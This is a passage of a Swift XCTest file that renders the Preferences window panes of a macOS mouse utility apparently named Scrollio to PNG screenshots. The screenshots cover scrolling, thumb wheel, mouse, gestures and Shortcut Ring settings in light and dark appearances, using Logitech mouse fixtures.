//
//  PreferencesWindowRenderTests.swift
//  MosTests
//
//  Renders the panes of the Preferences window off screen, the way the window shows them:
//  every pane in its 520 pt column of the real window, in its main states, light and dark,
//  an app's page under Apps, and the kit's list (PreferencesListBox) in a key and a
//  non-key window. The appearance is set on the window, so every pane
//  gets it through the window's materials, as on screen (the parent, not the pane: a pane
//  given its appearance directly misses the vibrancy of the material above it). The window
//  is never shown.
//
//  Off screen the behind-window materials draw nothing, so the window colour stands in
//  for them, and vibrant text would not be blended by the window server (the panes draw
//  without vibrancy, see PreferencesBackgroundView; the sidebar, a glass material with
//  vibrant names, draws almost nothing, so it is never written). The app is not active,
//  so `RenderWindow` answers AppKit's `hasKeyAppearance`: the controls of a key window draw
//  in the accent colour, as in the front window of the active app.
//
//  The accent colour of the app's own drawings (the lit parts of the mouse, the previews,
//  the number on a lit button, a key that is already bound) is the app's purple whatever
//  accent this Mac's user chose: `ForcedAppAccent` makes `NSColor.controlAccentColor`
//  return the asset catalog's `AccentColor` while the pictures are drawn. macOS gives an
//  app its own accent only while the user's choice is "Multicolour", and the tests do not
//  change that setting; colours AppKit works out by itself (a list's selection, the
//  switches) still follow the user's choice.
//
//  Only runs when asked to:
//  `TEST_RUNNER_SCROLLIO_SHOTS_DIR=<folder> xcodebuild … test -only-testing:ScrollioTests/PreferencesWindowRenderTests`.
//

import Carbon.HIToolbox
import ObjectiveC
import XCTest
@testable import Scrollio_Debug

final class PreferencesWindowRenderTests: XCTestCase {

    private let app = Bundle(for: PreferencesSplitViewController.self)
    private var savedScroll: OPTIONS_SCROLL_DEFAULT!
    private var savedMouse = LogiMouseSettings.default
    private var savedWheel = LogiWheelSettings.default
    private var savedGesture = MouseGestureSettings.default
    private var savedThumbWheel = ThumbWheelSettings.default
    private var savedBindings: [ButtonBinding] = []
    private var savedAllowlist = false
    private var addedApplications: [String] = []
    private var directory: URL!

    override func setUpWithError() throws {
        try super.setUpWithError()
        directory = try RenderShots.directory(for: "the Preferences window")
        try ForcedAppAccent.install()
        savedScroll = Options.shared.scroll
        savedMouse = Options.shared.logiMouse
        savedWheel = Options.shared.logiWheel
        savedGesture = Options.shared.gesture
        savedThumbWheel = Options.shared.thumbWheel
        savedBindings = Options.shared.buttons.binding
        savedAllowlist = Options.shared.application.allowlist
        Options.shared.scroll = OPTIONS_SCROLL_DEFAULT()
        Options.shared.thumbWheel = .default
    }

    override func tearDown() {
        if let savedScroll {
            Options.shared.scroll = savedScroll
        }
        Options.shared.logiMouse = savedMouse
        Options.shared.logiWheel = savedWheel
        Options.shared.gesture = savedGesture
        Options.shared.thumbWheel = savedThumbWheel
        Options.shared.buttons.binding = savedBindings
        Options.shared.application.allowlist = savedAllowlist
        for key in addedApplications where Options.shared.application.applications.get(by: key) != nil {
            Options.shared.application.applications.remove(from: key)
        }
        addedApplications = []
        ForcedAppAccent.uninstall()
        super.tearDown()
    }

    // MARK: - Panes

    func testRenderScrolling() throws {
        for advanced in [false, true] {
            let state = advanced ? "advanced" : "closed"
            Options.shared.scroll = OPTIONS_SCROLL_DEFAULT()
            try renderPane(PANEL_IDENTIFIER.scrolling, name: "scrolling-\(state)", prepare: { preferences in
                (preferences.controller(for: PANEL_IDENTIFIER.scrolling) as? PreferencesScrollingViewController)?
                    .uiStateDefaults = self.uiDefaults(advanced: advanced)
            })
            Options.shared.scroll.smooth = false
            try renderPane(PANEL_IDENTIFIER.scrolling, name: "scrolling-\(state)-smoothing-off", prepare: { preferences in
                (preferences.controller(for: PANEL_IDENTIFIER.scrolling) as? PreferencesScrollingViewController)?
                    .uiStateDefaults = self.uiDefaults(advanced: advanced)
            })
        }
    }

    /// The thumb wheel (`thumb-wheel-<case>-<appearance>.png`). Scrolling: the defaults, also
    /// in the 640 pt window of a first opening; "Switch Tabs" at 1.5× with the direction
    /// swapped; "Back and Forward" (its symbol); scrolling sideways with smoothing off (the speed's line says where it
    /// applies). Buttons, an MX Master 4: its row at the defaults ("Default"),
    /// "Switch Tabs" with the row selected (the card lights the thumb wheel), the row pointed
    /// at; "Back and Forward"; an MX Master 3S.
    func testRenderThumbWheel() throws {
        func scrolling(_ name: String) throws {
            try renderPane(PANEL_IDENTIFIER.scrolling, name: name, prepare: { preferences in
                (preferences.controller(for: PANEL_IDENTIFIER.scrolling) as? PreferencesScrollingViewController)?
                    .uiStateDefaults = self.uiDefaults(advanced: false)
            })
        }
        Options.shared.scroll = OPTIONS_SCROLL_DEFAULT()
        Options.shared.thumbWheel = .default
        try scrolling("thumb-wheel-scrolling-default")
        // In the window of a first opening (640 pt): where the group sits without scrolling.
        try renderPane(PANEL_IDENTIFIER.scrolling, name: "thumb-wheel-scrolling-default-window",
                       windowHeight: PreferencesWindowLayout.defaultContentHeight, prepare: { preferences in
            (preferences.controller(for: PANEL_IDENTIFIER.scrolling) as? PreferencesScrollingViewController)?
                .uiStateDefaults = self.uiDefaults(advanced: false)
        })
        Options.shared.thumbWheel = ThumbWheelSettings(function: .tabs, speed: 1.5, swapsDirection: true)
        try scrolling("thumb-wheel-scrolling-tabs")
        Options.shared.thumbWheel = ThumbWheelSettings(function: .backForward)
        try scrolling("thumb-wheel-scrolling-back-forward")
        Options.shared.thumbWheel = .default
        Options.shared.scroll.smooth = false
        try scrolling("thumb-wheel-scrolling-smoothing-off")
        Options.shared.scroll = OPTIONS_SCROLL_DEFAULT()

        func source(_ name: String?) -> ButtonsDeviceSource {
            return ButtonsDeviceSource(captureStatus: { _ in .normal }, deviceName: { name }, isBusy: { false }, refresh: {}, warnBluetoothButton: { _ in })
        }
        Options.shared.buttons.binding = [
            binding(1001, SystemShortcut.screenshotSelection.identifier),
            binding(5, SystemShortcut.copy.identifier, modifiers: UInt(CGEventFlags.maskAlternate.rawValue)),
        ]
        try renderButtons(name: "thumb-wheel-buttons-mx4-default", source: source("MX Master 4"))
        Options.shared.thumbWheel = ThumbWheelSettings(function: .tabs, speed: 1.5, swapsDirection: true)
        try renderButtons(name: "thumb-wheel-buttons-mx4-tabs-selected", source: source("MX Master 4")) { buttons in
            buttons.list.select(ButtonsListLayout.thumbWheelRowID)
        }
        try renderButtons(name: "thumb-wheel-buttons-mx4-tabs-hovered", source: source("MX Master 4")) { buttons in
            if let row = buttons.thumbWheelRow {
                self.hover(buttons, row: row)
            }
        }
        Options.shared.thumbWheel = ThumbWheelSettings(function: .backForward)
        try renderButtons(name: "thumb-wheel-buttons-mx4-back-forward", source: source("MX Master 4"))
        Options.shared.thumbWheel = .default
        try renderButtons(name: "thumb-wheel-buttons-mx3s", source: source("MX Master 3S"))
    }

    func testRenderMouse() throws {
        let master4 = MouseDeviceFixtures.mxMaster4()
        Options.shared.logiMouse = .default
        Options.shared.logiWheel = LogiWheelSettings(managedByScrollio: true)
        try renderMouse([master4], name: "mouse-mx-master-4-managed")
        Options.shared.logiMouse = LogiMouseSettings(pointerDPI: 1600, hapticsOn: true, hapticStrength: 60, pressForce: 5167)
        try renderMouse([master4], name: "mouse-mx-master-4-managed-haptics-on")
        // Why a value is not on the mouse: refused, with "Send Again" under the switch; then
        // still being sent, without it.
        Options.shared.logiMouse = LogiMouseSettings(pointerDPI: 1600)
        try renderMouse([MouseDeviceFixtures.mxMaster4(mismatches: [.pointerSpeed: .refused])], name: "mouse-mx-master-4-refused")
        try renderMouse([MouseDeviceFixtures.mxMaster4(mismatches: [.pointerSpeed: .sending])], name: "mouse-mx-master-4-sending")
        Options.shared.logiMouse = .default
        // Two mice, managed: the card names the one the choices also go to.
        try renderMouse([master4, MouseDeviceFixtures.mxMaster3S()], name: "mouse-two-mice-managed")
        Options.shared.logiWheel = .default
        try renderMouse([master4], name: "mouse-mx-master-4-not-managed")
        try renderMouse([MouseDeviceFixtures.mxMaster3S()], name: "mouse-mx-master-3s")
        try renderMouse([], name: "mouse-no-mouse")
    }

    /// The modes with and without a Logitech mouse, no gesture button, and the MX Master 4
    /// with its haptics off because they were switched off under Mouse (the line under the
    /// Logitech box with "Show in Mouse").
    func testRenderGestures() throws {
        let master4 = MouseGestureDeviceSupport(deviceTracking: true, haptics: true)
        let master4HapticsOff = MouseGestureDeviceSupport(deviceTracking: true, haptics: true, hapticsOffOnMouse: true)
        let cases: [(name: String, mode: MouseGestureMode, support: MouseGestureDeviceSupport, bound: Bool, hapticsOnUnderMouse: Bool?)] = [
            ("gestures-discrete-no-logitech", .discrete, .none, true, nil),
            ("gestures-discrete-mx-master-4", .discrete, master4, true, nil),
            ("gestures-discrete-mx-master-4-haptics-off", .discrete, master4HapticsOff, true, false),
            ("gestures-follow-no-logitech", .interactive, .none, true, nil),
            ("gestures-follow-mx-master-4", .interactive, master4, true, nil),
            ("gestures-no-gesture-button", .discrete, .none, false, nil),
        ]
        for item in cases {
            var gesture = MouseGestureSettings.default
            gesture.mode = item.mode
            gesture.deviceTracking = item.support.deviceTracking
            Options.shared.gesture = gesture
            Options.shared.logiMouse = LogiMouseSettings(hapticsOn: item.hapticsOnUnderMouse)
            // A pane of its own: "Follow the hand" is available whatever this Mac says.
            try renderPane(GesturesPreferencesViewController.tabIdentifier, name: item.name, replacement: {
                let gestures = GesturesPreferencesViewController(isInteractiveAvailable: { true })
                gestures.deviceSource = MouseGestureDeviceSource(support: { item.support }, refresh: {})
                gestures.bindingSummary = {
                    MouseGestureBindingSummary(
                        hasGestureButton: item.bound,
                        hasLogitechGestureButton: item.support.deviceTracking,
                        buttonTitles: item.bound ? (item.support.deviceTracking ? ["Gesture button"] : ["Back button"]) : [],
                        picture: item.bound ? self.gesturePicture(logitech: item.support.deviceTracking) : .none
                    )
                }
                return gestures
            }, afterLoad: { controller in
                guard let gestures = controller as? GesturesPreferencesViewController else { return }
                gestures.previewView.prefersReducedMotion = { true }
                gestures.previewView.reduceMotionDidChange()
                gestures.previewView.mouseSource = { item.support.deviceTracking ? .mxMaster4 : .generic }
                gestures.previewView.reloadMouse()
            })
        }
    }

    /// What the fixtures' "Gesture button" (a Logitech mouse) or "Back button" is.
    private func gesturePicture(logitech: Bool) -> TriggerPictureSource {
        let code = logitech ? LogiCenter.shared.scrollioCode(for: .gesture) : 3
        return TriggerPictureSource(event: RecordedEvent(type: .mouse, code: code, modifiers: 0, deviceFilter: nil))
    }

    /// The picture of the Gestures pane for each case of the trigger
    /// (`gestures-trigger-<case>-<appearance>.png`): on each drawing the button that runs
    /// the gestures, lit where the drawing has it and a badge where not; a numbered button,
    /// placed or not; a modifier held with it; two buttons (the first shows); a button only
    /// Notes has; nothing. The header and its first box, Reduce Motion on (the still frame).
    func testRenderGesturesTriggerPicture() throws {
        let gestures = SystemShortcut.mouseGestureNavigation.identifier
        let option = UInt(CGEventFlags.maskAlternate.rawValue)
        func logi(_ role: LogiControlRole) -> UInt16 { return LogiCenter.shared.scrollioCode(for: role) }
        let notes = Application(path: "/System/Applications/Notes.app")
        notes.buttons = OPTIONS_BUTTONS_DEFAULT()
        notes.buttons?.binding = [binding(logi(.thumbPanel), gestures)]
        let cases: [(name: String, model: MouseArtworkModel, bindings: [ButtonBinding], apps: [Application])] = [
            ("mx4-gesture", .mxMaster4, [binding(logi(.gesture), gestures)], []),
            ("mx4-thumb-panel", .mxMaster4, [binding(logi(.thumbPanel), gestures)], []),
            ("mx4-middle", .mxMaster4, [binding(logi(.middle), gestures)], []),
            ("mx4-mode-shift", .mxMaster4, [binding(logi(.modeShift), gestures)], []),
            ("mx3-gesture", .mxMaster3, [binding(logi(.gesture), gestures)], []),
            ("mx3-thumb-panel", .mxMaster3, [binding(logi(.thumbPanel), gestures)], []),
            ("mx3-back", .mxMaster3, [binding(logi(.back), gestures)], []),
            ("anywhere-forward", .mxAnywhere3, [binding(logi(.forward), gestures)], []),
            ("vertical-pointer-speed", .mxVertical, [binding(logi(.pointerSpeed), gestures)], []),
            ("generic-back", .generic, [binding(3, gestures)], []),
            ("generic-gesture", .generic, [binding(logi(.gesture), gestures)], []),
            ("button6", .mxMaster4, [binding(6, gestures)], []),
            ("button6-placed-thumb-panel", .mxMaster4, [ButtonBinding(
                triggerEvent: RecordedEvent(type: .mouse, code: 6, modifiers: 0, deviceFilter: nil, mousePart: .thumbPanel),
                systemShortcutName: gestures
            )], []),
            ("option-back", .mxMaster4, [binding(3, gestures, modifiers: option)], []),
            ("two-thumb-panel-back", .mxMaster4, [binding(logi(.thumbPanel), gestures), binding(3, gestures)], []),
            ("only-in-notes", .mxMaster4, [binding(3, SystemShortcut.copy.identifier)], [notes]),
            ("none-mx4", .mxMaster4, [], []),
            ("none-generic", .generic, [], []),
        ]
        var gesture = MouseGestureSettings.default
        gesture.mode = .discrete
        Options.shared.gesture = gesture
        Options.shared.logiMouse = LogiMouseSettings()
        for item in cases {
            let summary = MouseGestureBindingSummary(
                bindings: item.bindings, applications: item.apps, isLogitechCode: { LogiCenter.shared.isLogiCode($0) }
            )
            try renderPane(GesturesPreferencesViewController.tabIdentifier, name: "gestures-trigger-\(item.name)", titled: TitledCut(boxes: 1), replacement: {
                let pane = GesturesPreferencesViewController(isInteractiveAvailable: { true })
                // (With the Logitech box shown: a hidden box would count as the first one of the cut.)
                pane.deviceSource = MouseGestureDeviceSource(support: { MouseGestureDeviceSupport(deviceTracking: true, haptics: true) }, refresh: {})
                pane.bindingSummary = { summary }
                return pane
            }, afterLoad: { controller in
                guard let pane = controller as? GesturesPreferencesViewController else { return }
                pane.previewView.prefersReducedMotion = { true }
                pane.previewView.reduceMotionDidChange()
                pane.previewView.mouseSource = { item.model }
                pane.previewView.reloadMouse()
            })
        }
    }

    /// The ring of a press in the Gestures pane's picture on the MX Master 4, the mouse view
    /// alone at four times its size (`gestures-press-mx4-<part>-<ring>-<appearance>.png`):
    /// Forward and the thumb panel held, the button up as at a release, the ring at rest
    /// (00) and at three moments of its fading (80, 60, 40). It never covers the thumb
    /// wheel.
    func testRenderGesturesPressRing() throws {
        for (name, role) in [("forward", LogiControlRole.forward), ("thumb-panel", .thumbPanel)] {
            for ring in [0.0, 0.8, 0.6, 0.4] {
                let view = GesturePreviewView(frame: NSRect(x: 0, y: 0, width: 480, height: GesturePreviewView.preferredHeight))
                view.mouseSource = { .mxMaster4 }
                view.reloadMouse()
                let code = LogiCenter.shared.scrollioCode(for: role)
                view.picture = TriggerPictureSource(event: RecordedEvent(type: .mouse, code: code, modifiers: 0, deviceFilter: nil))
                view.prefersReducedMotion = { true }
                view.reduceMotionDidChange()
                let mouse = view.deviceCard.mouse
                mouse.removeFromSuperview()
                mouse.setFrameOrigin(.zero)
                mouse.show(buttonDepth: 0, pressPulse: ring, turn: 1)
                try renderDrawing(mouse, name: String(format: "gestures-press-mx4-%@-%02d", name, Int(ring * 100)), scale: 4)
            }
        }
    }

    /// Gestures that send a recorded key combination (`gestures-pane-keys-<appearance>.png`):
    /// Up with a name and an icon, the click with its keys only, and the pointer over Up, so
    /// that the preview shows Up's icon; `gestures-pane-keys-click-…`: over Click, whose
    /// keys the preview shows.
    func testRenderGestureKeys() throws {
        let savedGesture = Options.shared.gesture
        defer { Options.shared.gesture = savedGesture }
        let shiftCommand = UInt64(CGEventFlags.maskCommand.rawValue | CGEventFlags.maskShift.rawValue)
        let optionCommand = UInt64(CGEventFlags.maskCommand.rawValue | CGEventFlags.maskAlternate.rawValue)
        var gesture = MouseGestureSettings.default
        gesture.actions.up = GestureAction(
            action: "custom::15:\(shiftCommand)", label: ShortcutLabel(name: "Reload", icon: .symbol("arrow.clockwise"))
        )
        gesture.actions.click = GestureAction(action: "custom::40:\(optionCommand)")
        Options.shared.gesture = gesture
        for (name, slot) in [("gestures-pane-keys", MouseGestureSettingsControls.Slot.up), ("gestures-pane-keys-click", .click)] {
            try renderPane(GesturesPreferencesViewController.tabIdentifier, name: name, replacement: {
                let gestures = GesturesPreferencesViewController(isInteractiveAvailable: { true })
                gestures.deviceSource = MouseGestureDeviceSource(support: { .none }, refresh: {})
                gestures.bindingSummary = {
                    MouseGestureBindingSummary(
                        hasGestureButton: true, hasLogitechGestureButton: false, buttonTitles: ["Back button"],
                        picture: self.gesturePicture(logitech: false)
                    )
                }
                return gestures
            }, afterLoad: { controller in
                guard let gestures = controller as? GesturesPreferencesViewController else { return }
                gestures.previewView.prefersReducedMotion = { true }
                gestures.previewView.reduceMotionDidChange()
                gestures.slotHoverChanged(slot, inside: true)
            })
        }
    }

    /// The Shortcut Ring pane: a button and a key open the ring (the picture shows the first,
    /// the thumb panel of an MX Master 4), the default ring, and the pointer over the row of
    /// "Bottom left" (its place is lit in the drawing).
    func testRenderRing() throws {
        let savedRing = Options.shared.ring
        defer { Options.shared.ring = savedRing }
        Options.shared.ring = .default
        let thumbPanel = RecordedEvent(type: .mouse, code: LogiCenter.shared.scrollioCode(for: .thumbPanel), modifiers: 0, deviceFilter: nil)
        try renderPane(RingPreferencesViewController.tabIdentifier, name: "ring-pane", titled: TitledCut(), replacement: {
            let ring = RingPreferencesViewController()
            ring.bindingSummary = {
                ShortcutRingBindingSummary(triggerTitles: ["Thumb panel", "⌃⌥ Space"], picture: TriggerPictureSource(event: thumbPanel))
            }
            return ring
        }, afterLoad: { controller in
            guard let ring = controller as? RingPreferencesViewController else { return }
            Self.stillTriggerCard(of: ring, mouse: .mxMaster4)
            ring.placeHoverChanged(5, inside: true)
        })
    }

    /// The Shortcut Ring and Gestures panes while nothing opens the ring and no button runs
    /// the gestures, their sections folded under their titles and all of them opened
    /// (`ring-pane-empty-folded`, `ring-pane-empty-unfolded`, `gestures-pane-empty-folded`,
    /// `gestures-pane-empty-unfolded`), and as they are once a trigger is set
    /// (`ring-pane-set`, `gestures-pane-set`), light and dark; an MX Master 4 is connected.
    func testRenderQuietEmptyPanes() throws {
        let savedRing = Options.shared.ring
        defer { Options.shared.ring = savedRing }
        Options.shared.ring = .default
        var gesture = MouseGestureSettings.default
        gesture.mode = .discrete
        Options.shared.gesture = gesture
        Options.shared.logiMouse = LogiMouseSettings(hapticsOn: nil)
        let master4 = MouseGestureDeviceSupport(deviceTracking: true, haptics: true)
        let thumbPanel = RecordedEvent(type: .mouse, code: LogiCenter.shared.scrollioCode(for: .thumbPanel), modifiers: 0, deviceFilter: nil)

        for (state, opens, unfolds) in [("empty-folded", false, false), ("empty-unfolded", false, true), ("set", true, false)] {
            try renderPane(RingPreferencesViewController.tabIdentifier, name: "ring-pane-\(state)", titled: TitledCut(), replacement: {
                let ring = RingPreferencesViewController()
                ring.bindingSummary = {
                    opens
                        ? ShortcutRingBindingSummary(triggerTitles: ["Thumb panel"], picture: TriggerPictureSource(event: thumbPanel))
                        : ShortcutRingBindingSummary(triggerTitles: [])
                }
                return ring
            }, afterLoad: { controller in
                guard let ring = controller as? RingPreferencesViewController else { return }
                Self.stillTriggerCard(of: ring, mouse: .mxMaster4)
                if unfolds {
                    ring.placesSection?.setExpanded(true)
                    PreferencesForm.fitToContent(ring)
                }
            })

            try renderPane(GesturesPreferencesViewController.tabIdentifier, name: "gestures-pane-\(state)", titled: TitledCut(), replacement: {
                let gestures = GesturesPreferencesViewController(isInteractiveAvailable: { true })
                gestures.deviceSource = MouseGestureDeviceSource(support: { master4 }, refresh: {})
                gestures.bindingSummary = {
                    MouseGestureBindingSummary(
                        hasGestureButton: opens,
                        hasLogitechGestureButton: opens,
                        buttonTitles: opens ? ["Gesture button"] : [],
                        picture: opens ? self.gesturePicture(logitech: true) : .none
                    )
                }
                return gestures
            }, afterLoad: { controller in
                guard let gestures = controller as? GesturesPreferencesViewController else { return }
                gestures.previewView.prefersReducedMotion = { true }
                gestures.previewView.reduceMotionDidChange()
                gestures.previewView.mouseSource = { .mxMaster4 }
                gestures.previewView.reloadMouse()
                if unfolds {
                    gestures.foldingSections.forEach { $0.setExpanded(true) }
                    gestures.reload()
                }
            })
        }
    }

    /// The trigger card of a Shortcut Ring pane shows `mouse`, as Reduce Motion has it: no
    /// press, the light and the turn at once.
    private static func stillTriggerCard(of ring: RingPreferencesViewController, mouse: MouseArtworkModel) {
        guard let card = ring.triggerCard else { return }
        card.prefersReducedMotion = { true }
        card.mouseSource = { mouse }
        card.reloadMouse()
    }

    /// The picture of what opens the Shortcut Ring (`ring-trigger-<case>-<appearance>.png`):
    /// the header and the first box, Reduce Motion on, for every case of the picture: a part
    /// of each drawing (from the side and from above), a numbered button, a part the drawing
    /// lacks, a button with a modifier, keys (a long combination drawn smaller), two triggers
    /// (the first shows), a trigger only in Notes, and nothing on an MX Master 4 and on the
    /// plain mouse.
    func testRenderRingTriggerPicture() throws {
        let savedRing = Options.shared.ring
        defer { Options.shared.ring = savedRing }
        Options.shared.ring = .default
        func logitech(_ role: LogiControlRole) -> RecordedEvent {
            return RecordedEvent(type: .mouse, code: LogiCenter.shared.scrollioCode(for: role), modifiers: 0, deviceFilter: nil)
        }
        func button(_ code: UInt16, modifiers: CGEventFlags = []) -> RecordedEvent {
            return RecordedEvent(type: .mouse, code: code, modifiers: UInt(modifiers.rawValue), deviceFilter: nil)
        }
        func key(_ code: UInt16, modifiers: CGEventFlags) -> RecordedEvent {
            return RecordedEvent(type: .keyboard, code: code, modifiers: UInt(modifiers.rawValue), deviceFilter: nil)
        }
        func ring(_ event: RecordedEvent) -> ButtonBinding {
            return ButtonBinding(triggerEvent: event, systemShortcutName: SystemShortcut.shortcutRing.identifier, isEnabled: true)
        }
        let notes = "/System/Applications/Notes.app"
        let controlOption: CGEventFlags = [.maskControl, .maskAlternate]
        // What the pane is given: the bindings of Buttons, as the pane names and draws them.
        let cases: [(name: String, mouse: MouseArtworkModel, bindings: [RecordedEvent], onlyInNotes: Bool)] = [
            ("mx4-thumb-panel", .mxMaster4, [logitech(.thumbPanel)], false),
            ("mx4-gesture", .mxMaster4, [logitech(.gesture)], false),
            ("mx3-gesture", .mxMaster3, [logitech(.gesture)], false),
            ("anywhere-back", .mxAnywhere3, [button(3)], false),
            ("vertical-pointer-speed", .mxVertical, [logitech(.pointerSpeed)], false),
            ("generic-middle", .generic, [button(2)], false),
            ("generic-thumb-panel", .generic, [logitech(.thumbPanel)], false),
            ("button6", .mxMaster4, [button(6)], false),
            ("option-back", .mxMaster4, [button(3, modifiers: .maskAlternate)], false),
            ("key-ctrl-opt-space", .mxMaster4, [key(49, modifiers: controlOption)], false),
            ("key-f13", .mxMaster4, [key(105, modifiers: [])], false),
            ("key-long", .mxMaster4, [key(121, modifiers: [.maskControl, .maskAlternate, .maskShift, .maskCommand])], false),
            ("thumb-panel-and-key", .mxMaster4, [logitech(.thumbPanel), key(49, modifiers: controlOption)], false),
            ("only-in-notes", .mxMaster4, [logitech(.thumbPanel)], true),
            // (Notes opens its own ring there: this one's places fold.)
            ("only-in-notes-own-ring", .mxMaster4, [logitech(.thumbPanel)], true),
            ("none-mx4", .mxMaster4, [], false),
            ("none-generic", .generic, [], false),
        ]
        for item in cases {
            let summary: ShortcutRingBindingSummary
            if item.onlyInNotes {
                let app = Application(path: notes)
                app.setOwnButtonBindings(item.bindings.map(ring))
                if item.name.hasSuffix("own-ring") {
                    app.setUsesGeneralRing(false, general: .default)
                }
                summary = ShortcutRingBindingSummary(bindings: [], applications: [app])
            } else {
                summary = ShortcutRingBindingSummary(bindings: item.bindings.map(ring))
            }
            try renderPane(RingPreferencesViewController.tabIdentifier, name: "ring-trigger-\(item.name)", titled: TitledCut(boxes: 1), replacement: {
                let pane = RingPreferencesViewController()
                pane.bindingSummary = { summary }
                return pane
            }, afterLoad: { controller in
                guard let pane = controller as? RingPreferencesViewController else { return }
                Self.stillTriggerCard(of: pane, mouse: item.mouse)
            })
        }
    }

    /// The pull-down that chooses the button (`trigger-choice-<case>-<appearance>.png`): the
    /// header and the first box of Gestures and of Shortcut Ring with nothing ("Choose"),
    /// one button, a long name, a key (the ring's), two ("Multiple") and only in Notes; and
    /// its open menu (`trigger-choice-menu-<case>-…`), drawn as a stand-in (a menu is a
    /// window of its own and is never opened here): the items with their titles in the
    /// menu's font and colours, the tick, the separators.
    func testRenderTriggerChoice() throws {
        let savedRing = Options.shared.ring
        defer { Options.shared.ring = savedRing }
        Options.shared.ring = .default
        Options.shared.gesture = .default
        func logi(_ role: LogiControlRole) -> UInt16 { return LogiCenter.shared.scrollioCode(for: role) }
        func bind(_ code: UInt16, _ action: String, type: Scrollio_Debug.EventType = .mouse, modifiers: CGEventFlags = []) -> ButtonBinding {
            return ButtonBinding(
                triggerEvent: RecordedEvent(type: type, code: code, modifiers: UInt(modifiers.rawValue), deviceFilter: nil),
                systemShortcutName: action, isEnabled: true
            )
        }
        func source(_ name: String) -> ButtonsDeviceSource {
            return ButtonsDeviceSource(captureStatus: { _ in .normal }, deviceName: { name }, isBusy: { false }, refresh: {}, warnBluetoothButton: { _ in })
        }
        let gestures = SystemShortcut.mouseGestureNavigation.identifier
        let ring = SystemShortcut.shortcutRing.identifier
        let copy = SystemShortcut.copy.identifier
        let notes = Application(path: "/System/Applications/Notes.app")
        notes.buttons = OPTIONS_BUTTONS_DEFAULT()

        let gestureCases: [(name: String, bindings: [ButtonBinding], onlyInNotes: Bool)] = [
            ("choose", [], false),
            ("one", [bind(logi(.gesture), gestures)], false),
            ("long-name", [bind(logi(.modeShift), gestures)], false),
            ("multiple", [bind(3, gestures), bind(4, gestures)], false),
            ("only-in-notes", [], true),
        ]
        for item in gestureCases {
            Options.shared.buttons.binding = item.bindings
            notes.buttons?.binding = item.onlyInNotes ? [bind(3, gestures)] : []
            try renderPane(GesturesPreferencesViewController.tabIdentifier, name: "trigger-choice-gestures-\(item.name)",
                           titled: TitledCut(boxes: 2), replacement: {
                let pane = GesturesPreferencesViewController(isInteractiveAvailable: { true })
                pane.deviceSource = MouseGestureDeviceSource(support: { .none }, refresh: {})
                pane.bindingSummary = {
                    MouseGestureBindingSummary(bindings: item.bindings, applications: [notes], isLogitechCode: { LogiCenter.shared.isLogiCode($0) })
                }
                return pane
            }, afterLoad: { controller in
                guard let pane = controller as? GesturesPreferencesViewController else { return }
                pane.triggerChooser.deviceSource = source("MX Master 3S")
                pane.previewView.prefersReducedMotion = { true }
                pane.previewView.reduceMotionDidChange()
                pane.previewView.mouseSource = { .mxMaster3 }
                pane.previewView.reloadMouse()
                pane.reload()
            })
        }

        let control: CGEventFlags = [.maskControl, .maskAlternate]
        let ringCases: [(name: String, bindings: [ButtonBinding])] = [
            ("choose", []),
            ("one", [bind(logi(.thumbPanel), ring)]),
            ("key", [bind(49, ring, type: .keyboard, modifiers: control)]),
            ("multiple", [bind(logi(.thumbPanel), ring), bind(49, ring, type: .keyboard, modifiers: control)]),
        ]
        for item in ringCases {
            Options.shared.buttons.binding = item.bindings
            try renderPane(RingPreferencesViewController.tabIdentifier, name: "trigger-choice-ring-\(item.name)",
                           titled: TitledCut(boxes: 1), replacement: {
                let pane = RingPreferencesViewController()
                pane.bindingSummary = { ShortcutRingBindingSummary(bindings: item.bindings) }
                return pane
            }, afterLoad: { controller in
                guard let pane = controller as? RingPreferencesViewController else { return }
                pane.triggerChooser?.deviceSource = source("MX Master 4")
                Self.stillTriggerCard(of: pane, mouse: .mxMaster4)
                pane.reload()
            })
        }

        // The open menus.
        func menuItems(gestures pane: Bool, mouse: String, bindings: [ButtonBinding]) throws -> [NSMenuItem] {
            Options.shared.buttons.binding = bindings
            let chooser: TriggerChooser
            if pane {
                let gestures = GesturesPreferencesViewController(isInteractiveAvailable: { true })
                gestures.deviceSource = MouseGestureDeviceSource(support: { .none }, refresh: {})
                _ = gestures.view
                chooser = gestures.triggerChooser
            } else {
                let ring = RingPreferencesViewController()
                _ = ring.view
                chooser = try XCTUnwrap(ring.triggerChooser)
            }
            chooser.deviceSource = source(mouse)
            chooser.update(triggerTitles: chooser.triggerTitles)
            // (A pull-down's first item is its title; the menu shows the others.)
            return Array(try XCTUnwrap(chooser.pullDown.menu).items.dropFirst())
        }
        let menus: [(name: String, items: [NSMenuItem])] = [
            ("gestures-mx3", try menuItems(gestures: true, mouse: "MX Master 3S",
                                          bindings: [bind(3, copy), bind(logi(.gesture), gestures)])),
            ("ring-mx4", try menuItems(gestures: false, mouse: "MX Master 4",
                                      bindings: [bind(logi(.thumbPanel), ring), bind(3, copy), bind(logi(.gesture), gestures)])),
            ("ring-generic", try menuItems(gestures: false, mouse: "Mouse", bindings: [])),
        ]
        for menu in menus {
            for (suffix, appearanceName) in [("light", NSAppearance.Name.aqua), ("dark", .darkAqua)] {
                let appearance = try XCTUnwrap(NSAppearance(named: appearanceName))
                let sheet = MenuStandInView(items: menu.items)
                sheet.appearance = appearance
                try write(sheet, appearance: appearance, to: directory.appendingPathComponent("trigger-choice-menu-\(menu.name)-\(suffix).png"))
            }
        }
    }

    /// Recorded key combinations with a name and an icon (`ShortcutLabel`), as the rows
    /// show them: the Shortcut Ring pane (`ring-pane-named-<appearance>.png`: a place with
    /// both lit, then one with a name only, one with an icon only, one with a typed
    /// character, and plain keys beside them) and the Buttons pane
    /// (`buttons-pane-named-<appearance>.png`: the same cases on buttons).
    func testRenderNamedShortcuts() throws {
        let savedRing = Options.shared.ring
        defer {
            Options.shared.ring = savedRing
            ShortcutRingController.forgetPreparedFaces()
        }
        let shiftCommand = UInt64(CGEventFlags.maskCommand.rawValue | CGEventFlags.maskShift.rawValue)
        let optionCommand = UInt64(CGEventFlags.maskCommand.rawValue | CGEventFlags.maskAlternate.rawValue)
        let reload = "custom::15:\(shiftCommand)"
        let both = ShortcutLabel(name: "Reload", icon: .symbol("arrow.clockwise"))
        let nameOnly = ShortcutLabel(name: "Toggle Sidebar", icon: nil)
        let iconOnly = ShortcutLabel(name: nil, icon: .symbol("hammer"))
        let typed = ShortcutLabel(name: "Reply to All", icon: .character("↩"))
        let long = ShortcutLabel(name: "Paste and Match Style", icon: .symbol("doc.on.clipboard"))

        var ring = ShortcutRingSettings.default
